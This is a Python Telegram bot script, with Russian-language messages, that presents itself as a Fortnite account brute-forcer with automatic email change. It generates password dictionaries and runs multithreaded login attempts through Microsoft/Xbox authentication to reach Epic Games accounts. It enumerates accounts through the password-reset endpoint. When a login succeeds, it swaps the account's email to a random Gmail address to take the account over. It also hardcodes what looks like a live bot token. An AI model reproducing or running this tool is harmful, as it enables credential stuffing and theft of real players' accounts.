#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import asyncio
import logging
import time
import threading
import queue
import re
import random
import string
import requests
import json
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor, as_completed

from aiogram import Bot, Dispatcher, types
from aiogram.filters import Command
from aiogram.types import Message
from aiogram.client.default import DefaultBotProperties
from aiogram.enums import ParseMode

# ================== КОНФИГУРАЦИЯ ==================
BOT_TOKEN = "8874004875:AAEslk0sxxDKXNnWtvggCc3RKUTJB4NwV14"
ADMIN_IDS = [6372925425]

THREADS = 25
TIMEOUT = 12
DELAY_BETWEEN_ATTEMPTS = 0.2

# ================== ГЕНЕРАЦИЯ РАСШИРЕННОГО СЛОВАРЯ ПАРОЛЕЙ ==================
BASE_WORDS = [
    "password", "qwerty", "admin", "root", "toor", "ubuntu", "linux", "kali", "parrot",
    "blackbox", "research", "fortnite", "epicgames", "battle", "royale", "gaming",
    "winning", "legend", "dragon", "killer", "master", "michael", "jordan", "jennifer",
    "thomas", "charlie", "robert", "daniel", "jessica", "michelle", "amanda", "ashley",
    "nicole", "matthew", "andrew", "george", "joshua", "taylor", "ranger", "hunter",
    "buster", "soccer", "hockey", "baseball", "football", "superman", "batman", "starwars",
    "computer", "internet", "network", "security", "password1", "qwerty123", "admin123",
    "root123", "12345678", "123456789", "987654321", "11111111", "00000000"
]

SPECIALS = ["!", "@", "#", "$", "%", "^", "&", "*", "?"]
DIGITS = "0123456789"

def generate_password_variations(base_word):
    variations = set()
    for d in DIGITS:
        variations.add(base_word + d)
        variations.add(base_word + d + "!")
        variations.add(base_word + "!" + d)
        variations.add(base_word.capitalize() + d)
    for s in SPECIALS:
        variations.add(base_word + s)
        variations.add(s + base_word)
        variations.add(base_word + s + "1")
        variations.add("1" + s + base_word)
    leet_map = {'a':'4', 'e':'3', 'i':'1', 'o':'0', 's':'5', 't':'7'}
    leet_word = ''.join(leet_map.get(c, c) for c in base_word)
    variations.add(leet_word + "!")
    variations.add(leet_word + "123")
    variations.add(base_word + base_word)
    variations.add(base_word + base_word + "1")
    for year in ["2023","2024","2025","2026"]:
        variations.add(base_word + year)
        variations.add(year + base_word)
        variations.add(base_word.capitalize() + year + "!")
    return [p for p in variations if len(p) >= 8]

BUILTIN_PASSWORDS = []
for word in BASE_WORDS:
    BUILTIN_PASSWORDS.extend(generate_password_variations(word))
BUILTIN_PASSWORDS = sorted(set(BUILTIN_PASSWORDS))
EXTRA = [
    "Password123!", "Qwerty123!", "Admin2026!", "Root@2026",
    "Fortnite@123", "EpicGames2026", "BattleRoyal!", "Gaming@2025",
    "!QAZ2wsx", "1qazxsw2", "QAZwsx123", "!@#123qwe", "P@ssw0rd2026"
]
BUILTIN_PASSWORDS.extend(EXTRA)
BUILTIN_PASSWORDS = sorted(set(BUILTIN_PASSWORDS))
print(f"[+] Сгенерировано {len(BUILTIN_PASSWORDS)} паролей.")

# ================== ГЕНЕРАТОРЫ EMAIL ==================
def generate_random_gmail():
    length = random.randint(8, 12)
    username = ''.join(random.choices(string.ascii_lowercase + string.digits, k=length))
    return f"{username}@gmail.com"

def generate_unique_email(existing_set):
    while True:
        new_email = generate_random_gmail()
        if new_email not in existing_set:
            existing_set.add(new_email)
            return new_email

EMAIL_PREFIXES = [
    "user", "player", "gamer", "shadow", "killer", "master", "legend", "dragon",
    "night", "storm", "phantom", "vortex", "crystal", "blaze", "frost", "venom",
    "ranger", "hunter", "warrior", "sniper", "ninja", "pirate", "ghost", "wolf",
    "eagle", "falcon", "tiger", "bear", "panda", "koala", "slayer"
]

def generate_random_email_auto():
    prefix = random.choice(EMAIL_PREFIXES)
    suffix = ''.join(random.choices(string.digits, k=random.randint(2, 4)))
    return f"{prefix}{suffix}@gmail.com"

def generate_unique_email_auto(used_set):
    while True:
        email = generate_random_email_auto()
        if email not in used_set:
            used_set.add(email)
            return email

# ================== ЛОГИРОВАНИЕ ==================
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)
bot = Bot(token=BOT_TOKEN, default=DefaultBotProperties(parse_mode=ParseMode.HTML))
dp = Dispatcher()

# ================== ГЛОБАЛЬНЫЕ ПЕРЕМЕННЫЕ ==================
is_running = False
stop_flag = False
used_emails = set()

# ================== ФУНКЦИИ РАБОТЫ С EPIC API ==================
def get_session():
    session = requests.Session()
    session.headers.update({
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
        'Content-Type': 'application/json'
    })
    return session

def microsoft_auth(email, password):
    session = get_session()
    url = "https://login.microsoftonline.com/common/oauth2/v2.0/token"
    data = {
        "client_id": "000000004C12AE6F",
        "scope": "service::user.auth.xboxlive.com::MBI_SSL",
        "username": email,
        "password": password,
        "grant_type": "password"
    }
    try:
        resp = session.post(url, data=data, timeout=TIMEOUT)
        if resp.status_code != 200:
            return None, f"auth_failed_{resp.status_code}"
        token_data = resp.json()
        if 'access_token' not in token_data:
            return None, "no_token"
        xbl_url = "https://user.auth.xboxlive.com/user/authenticate"
        xbl_payload = {
            "Properties": {"AuthMethod": "RPS", "SiteName": "user.auth.xboxlive.com", "RpsTicket": token_data['access_token']},
            "RelyingParty": "http://auth.xboxlive.com",
            "TokenType": "JWT"
        }
        xbl_resp = session.post(xbl_url, json=xbl_payload, timeout=TIMEOUT)
        if xbl_resp.status_code != 200:
            return None, "xbl_failed"
        xbl_data = xbl_resp.json()
        xbl_token = xbl_data.get('Token')
        xsts_url = "https://xsts.auth.xboxlive.com/xsts/authorize"
        xsts_payload = {
            "Properties": {"SandboxId": "RETAIL", "UserTokens": [xbl_token]},
            "RelyingParty": "http://spartacertificate.epicgames.com",
            "TokenType": "JWT"
        }
        xsts_resp = session.post(xsts_url, json=xsts_payload, timeout=TIMEOUT)
        if xsts_resp.status_code != 200:
            return None, "xsts_failed"
        xsts_data = xsts_resp.json()
        user_hash = xsts_data.get('DisplayClaims', {}).get('xui', [{}])[0].get('uhs')
        token = xsts_data.get('Token')
        return {'user_hash': user_hash, 'token': token}, "success"
    except Exception as e:
        return None, f"error_{str(e)}"

def check_fortnite(user_hash, token):
    session = get_session()
    url = "https://spartacertificate.epicgames.com/api/v2/account"
    headers = {"Authorization": f"XBL3.0 x={user_hash};{token}", "Accept": "application/json"}
    try:
        resp = session.get(url, headers=headers, timeout=TIMEOUT)
        if resp.status_code == 200:
            data = resp.json()
            return {
                'full_access': True,
                'account_id': data.get('accountId'),
                'display_name': data.get('displayName'),
                'country': data.get('country'),
                'vbucks': data.get('currency', {}).get('vbucks', 0),
                'email': data.get('email', 'not_visible')
            }
        elif resp.status_code == 403:
            return {'full_access': False, 'reason': 'locked'}
        else:
            return {'full_access': False, 'reason': f'http_{resp.status_code}'}
    except Exception as e:
        return {'full_access': False, 'reason': str(e)}

def change_email(user_hash, token, new_email, password):
    session = get_session()
    url = "https://spartacertificate.epicgames.com/api/v2/account/email"
    headers = {
        "Authorization": f"XBL3.0 x={user_hash};{token}",
        "Content-Type": "application/json"
    }
    payload = {
        "newEmail": new_email,
        "password": password
    }
    try:
        resp = session.post(url, json=payload, headers=headers, timeout=TIMEOUT)
        if resp.status_code == 200:
            return True, "Email изменён успешно."
        elif resp.status_code == 400:
            return False, "Ошибка: неверный пароль или email уже используется."
        elif resp.status_code == 403:
            return False, "Доступ запрещён (возможно, требуется 2FA)."
        else:
            return False, f"HTTP {resp.status_code}: {resp.text[:100]}"
    except Exception as e:
        return False, f"Ошибка соединения: {str(e)}"

# ================== БРУТФОРС С ОБРАБОТКОЙ РЕЗУЛЬТАТА ==================
def attempt_login(email, password):
    auth_result, status = microsoft_auth(email, password)
    if status != "success" or auth_result is None:
        return None, status
    user_hash = auth_result.get('user_hash')
    token = auth_result.get('token')
    if not user_hash or not token:
        return None, "missing_credentials"
    account_info = check_fortnite(user_hash, token)
    if account_info.get('full_access', False):
        return {'user_hash': user_hash, 'token': token, 'account': account_info}, "success"
    else:
        return None, account_info.get('reason', 'unknown')

def worker_bruteforce(email, password_queue, result_queue, stop_event, found_flag):
    while not stop_event.is_set() and not found_flag.is_set():
        try:
            password = password_queue.get(timeout=1)
        except queue.Empty:
            break
        if found_flag.is_set():
            break
        result, status = attempt_login(email, password)
        result_queue.put({'password': password, 'status': status, 'result': result})
        if result is not None and result.get('account', {}).get('full_access', False):
            found_flag.set()
            break
        time.sleep(DELAY_BETWEEN_ATTEMPTS)

def run_bruteforce(email, passwords, progress_callback, new_email=None):
    found_flag = threading.Event()
    stop_event = threading.Event()
    password_queue = queue.Queue()
    for p in passwords:
        password_queue.put(p)
    result_queue = queue.Queue()
    results = []
    start_time = time.time()
    with ThreadPoolExecutor(max_workers=THREADS) as executor:
        futures = [
            executor.submit(worker_bruteforce, email, password_queue, result_queue, stop_event, found_flag)
            for _ in range(THREADS)
        ]
        total = len(passwords)
        checked = 0
        while not all(f.done() for f in futures):
            while not result_queue.empty():
                res = result_queue.get()
                checked += 1
                results.append(res)
                if res.get('result') is not None and res['result'].get('account', {}).get('full_access', False):
                    found_flag.set()
                    stop_event.set()
                    if new_email:
                        user_hash = res['result'].get('user_hash')
                        token = res['result'].get('token')
                        password = res['password']
                        success, msg = change_email(user_hash, token, new_email, password)
                        res['email_change'] = {'success': success, 'new_email': new_email, 'msg': msg}
                    else:
                        res['email_change'] = None
                if checked % 10 == 0:
                    progress_callback(checked, total, res.get('password', ''))
            if stop_flag:
                stop_event.set()
                break
            time.sleep(0.5)
        for f in futures:
            f.cancel()
    elapsed = time.time() - start_time
    return results, elapsed, found_flag.is_set()

# ================== ОБРАБОТЧИКИ КОМАНД ==================
def extract_emails(text):
    return re.findall(r'[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}', text)

@dp.message(Command("start"))
async def cmd_start(message: Message):
    if message.from_user.id not in ADMIN_IDS:
        await message.answer("⛔ Доступ запрещён.")
        return
    await message.answer(
        f"🤖 <b>Fortnite Ultimate BruteBot + Auto Email Change</b>\n\n"
        f"📚 Словарь: <b>{len(BUILTIN_PASSWORDS)}</b> паролей\n"
        f"🔧 Режимы:\n"
        f"   /bruteforce email — проверка указанного email\n"
        f"   /auto — автоматический подбор (генерация email)\n"
        f"   /gen_email — сгенерировать случайный Gmail\n"
        f"   /check_account email — проверка существования аккаунта\n"
        f"   /stop — остановка\n"
        f"   /status — статус"
    )

@dp.message(Command("gen_email"))
async def cmd_gen_email(message: Message):
    if message.from_user.id not in ADMIN_IDS:
        await message.answer("⛔ Доступ запрещён.")
        return
    new_email = generate_unique_email(used_emails)
    await message.answer(f"📧 Сгенерирован новый email: <b>{new_email}</b>")

@dp.message(Command("check_account"))
async def cmd_check_account(message: Message):
    if message.from_user.id not in ADMIN_IDS:
        await message.answer("⛔ Доступ запрещён.")
        return
    args = message.text.split(maxsplit=1)
    if len(args) < 2:
        await message.answer("❌ Укажите email: /check_account target@example.com")
        return
    email = args[1].strip()
    session = get_session()
    reset_url = "https://www.epicgames.com/account/v2/password/reset"
    data = {"email": email}
    try:
        resp = session.post(reset_url, json=data, timeout=10)
        if resp.status_code == 200:
            await message.answer(f"✅ Аккаунт с {email} существует (отправлен запрос сброса пароля).")
        elif resp.status_code == 404:
            await message.answer(f"❌ Аккаунт с {email} не найден.")
        else:
            await message.answer(f"⚠️ Неизвестный ответ {resp.status_code}")
    except Exception as e:
        await message.answer(f"⚠️ Ошибка: {str(e)}")

@dp.message(Command("bruteforce"))
async def cmd_bruteforce(message: Message):
    global is_running, stop_flag
    if message.from_user.id not in ADMIN_IDS:
        await message.answer("⛔ Доступ запрещён.")
        return
    if is_running:
        await message.answer("⏳ Уже идёт процесс. /stop для остановки.")
        return
    args = message.text.split(maxsplit=1)
    if len(args) < 2:
        await message.answer("❌ Укажите email: /bruteforce target@example.com")
        return
    email = args[1].strip()
    if not re.match(r'[^@]+@[^@]+\.[^@]+', email):
        await message.answer("❌ Некорректный email.")
        return
    new_email = generate_unique_email(used_emails)
    await message.answer(f"🔐 Будет попытка сменить почту на <b>{new_email}</b>")
    await start_bruteforce(message, email, new_email)

@dp.message(Command("auto"))
async def cmd_auto(message: Message):
    global is_running, stop_flag
    if message.from_user.id not in ADMIN_IDS:
        await message.answer("⛔ Доступ запрещён.")
        return
    if is_running:
        await message.answer("⏳ Уже идёт процесс. /stop для остановки.")
        return
    await message.answer("🚀 Автоматический режим: генерация email и перебор до первого успеха.")
    await start_auto_bruteforce(message)

@dp.message()
async def handle_text(message: Message):
    global is_running
    if message.from_user.id not in ADMIN_IDS:
        return
    if is_running:
        await message.answer("⏳ Уже идёт процесс. /stop для остановки.")
        return
    emails = extract_emails(message.text)
    if not emails:
        await message.answer("❌ Email не найден.")
        return
    email = emails[0]
    new_email = generate_unique_email(used_emails)
    await message.answer(f"🔐 Будет попытка сменить почту на <b>{new_email}</b>")
    await start_bruteforce(message, email, new_email)

async def start_bruteforce(message, email, new_email):
    global is_running, stop_flag
    is_running = True
    stop_flag = False
    passwords = BUILTIN_PASSWORDS
    progress_msg = await message.answer(f"🚀 Запуск брутфорса для {email}\n📚 Словарь: {len(passwords)}")
    def progress_callback(checked, total_pw, current_pw):
        asyncio.create_task(
            progress_msg.edit_text(
                f"⏳ {checked}/{total_pw} ({checked/total_pw*100:.1f}%)\n"
                f"🔑 {current_pw[:25]}..."
            )
        )
    try:
        results, elapsed, found = await asyncio.to_thread(
            run_bruteforce, email, passwords, progress_callback, new_email
        )
        if found:
            success = next((r for r in results if r.get('result') and r['result'].get('account', {}).get('full_access')), None)
            if success:
                account = success['result']['account']
                password = success['password']
                email_change = success.get('email_change', {})
                msg = (
                    f"✅ <b>АККАУНТ НАЙДЕН!</b>\n"
                    f"📧 Старая почта: {email}\n"
                    f"🔑 Пароль: <code>{password}</code>\n"
                    f"🆔 ID: {account.get('account_id')}\n"
                    f"👤 Имя: {account.get('display_name')}\n"
                    f"💎 V-Bucks: {account.get('vbucks', 0)}\n"
                    f"⏱️ {elapsed:.2f} сек\n"
                )
                if email_change and email_change.get('success'):
                    msg += f"✅ Почта изменена на: <b>{email_change['new_email']}</b>\n"
                    msg += f"📝 Сообщение: {email_change['msg']}"
                else:
                    msg += f"❌ Смена почты не удалась: {email_change.get('msg', 'неизвестная ошибка (возможно, требуется подтверждение по старой почте)')}"
                await message.answer(msg)
            else:
                await message.answer(f"❌ {email}: пароль не найден.")
        else:
            await message.answer(f"❌ {email}: перебрано {len(results)} вариантов, успеха нет.")
    except Exception as e:
        await message.answer(f"⚠️ Ошибка: {str(e)}")
    is_running = False
    await progress_msg.edit_text("✅ Завершено.")

async def start_auto_bruteforce(message):
    global is_running, stop_flag
    is_running = True
    stop_flag = False
    passwords = BUILTIN_PASSWORDS
    checked_emails = set()
    progress_msg = await message.answer("⏳ Генерация email...")
    attempt_count = 0
    while not stop_flag:
        email = generate_unique_email_auto(checked_emails)
        attempt_count += 1
        await progress_msg.edit_text(
            f"🔍 Попытка #{attempt_count}\n"
            f"📧 {email}\n"
            f"📚 Словарь: {len(passwords)} паролей\n"
            f"🔄 Перебор..."
        )
        def progress_callback(checked, total_pw, current_pw):
            asyncio.create_task(
                progress_msg.edit_text(
                    f"🔍 Попытка #{attempt_count}\n"
                    f"📧 {email}\n"
                    f"📊 {checked}/{total_pw} ({checked/total_pw*100:.1f}%)\n"
                    f"🔑 {current_pw[:25]}..."
                )
            )
        try:
            results, elapsed, found = await asyncio.to_thread(
                run_bruteforce, email, passwords, progress_callback, None
            )
            if found:
                success = next((r for r in results if r.get('result') and r['result'].get('account', {}).get('full_access')), None)
                if success:
                    account = success['result']['account']
                    password = success['password']
                    msg = (
                        f"✅ <b>АККАУНТ НАЙДЕН!</b>\n"
                        f"📧 Email: {email}\n"
                        f"🔑 Пароль: <code>{password}</code>\n"
                        f"🆔 ID: {account.get('account_id')}\n"
                        f"👤 Имя: {account.get('display_name')}\n"
                        f"💎 V-Bucks: {account.get('vbucks', 0)}\n"
                        f"⏱️ {elapsed:.2f} сек"
                    )
                    await message.answer(msg)
                    break
            else:
                continue
        except Exception as e:
            await message.answer(f"⚠️ Ошибка при {email}: {str(e)}")
            continue
    is_running = False
    await progress_msg.edit_text("⏹️ Процесс остановлен." if stop_flag else "✅ Автоподбор завершён.")

@dp.message(Command("stop"))
async def cmd_stop(message: Message):
    global is_running, stop_flag
    if message.from_user.id not in ADMIN_IDS:
        return
    if not is_running:
        await message.answer("ℹ️ Нет активного процесса.")
        return
    stop_flag = True
    await message.answer("⏹️ Остановка...")

@dp.message(Command("status"))
async def cmd_status(message: Message):
    if message.from_user.id not in ADMIN_IDS:
        return
    await message.answer("🟢 Активен" if is_running else "🔴 Ожидание")

async def main():
    await dp.start_polling(bot)

if __name__ == "__main__":
    asyncio.run(main())
